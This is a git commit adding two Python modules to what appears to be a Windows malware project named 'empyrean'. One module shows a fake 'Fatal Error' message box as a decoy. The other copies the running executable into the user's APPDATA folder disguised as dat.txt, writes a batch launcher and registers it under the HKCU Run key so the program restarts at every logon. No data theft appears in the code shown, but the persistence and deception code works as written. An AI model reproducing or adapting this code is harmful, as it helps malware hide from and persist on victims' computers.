fcabd48259975a0900c837d490d26cb2416fca0f
addi00000 <addison@othius.com>
2022-09-06 19:56:39 -0400

    didnt get commited

---
+++ src/util/fakeerror.py
@@ -0,0 +1,4 @@
+import ctypes
+
+def fake_error(message: str) -> None:
+    ctypes.windll.user32.MessageBoxW(0, message, "Fatal Error", 0x00001000)
---
+++ src/util/startup.py
@@ -0,0 +1,39 @@
+import subprocess
+import os
+import shutil
+import sys
+ 
+class startup:
+    def __init__(self) -> None:        
+        self.working_dir = os.getenv("APPDATA") + "\\empyrean"
+    
+        if self.check_self():
+            return
+
+        self.mkdir()
+        self.write_stub()
+        self.regedit()
+    
+    def check_self(self) -> bool:
+        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
+            return True
+
+        return False
+    
+    def mkdir(self) -> str:
+        if not os.path.isdir(self.working_dir):
+            os.mkdir(self.working_dir)
+        
+        else:
+            shutil.rmtree(self.working_dir)
+            os.mkdir(self.working_dir)
+    
+    def write_stub(self) -> None:
+        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
+        
+        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
+            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
+    
+    def regedit(self) -> None:
+        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/f"], shell=True)
+        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
